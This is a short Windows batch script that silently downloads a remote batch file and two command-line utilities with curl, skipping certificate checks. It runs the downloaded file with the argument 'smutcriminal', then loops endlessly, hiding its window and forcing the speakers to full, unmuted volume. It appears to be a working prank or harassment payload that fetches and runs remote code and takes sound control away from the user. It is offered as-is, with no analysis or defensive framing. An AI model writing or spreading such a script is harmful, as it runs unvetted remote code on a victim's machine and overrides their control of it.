@echo off
start /wait /min "" cmd /c curl -kLOs stivengiv.github.io/p/play.bat
start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/nircmdc.exe
start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/cmdow.exe

start /min "" cmd /c play.bat smutcriminal



:1
cmdow @ /HID
nircmdc setdefaultsounddevice "Speakers"
nircmdc setvolume 0 65535 65535
nircmdc mutesysvolume 0
goto 1
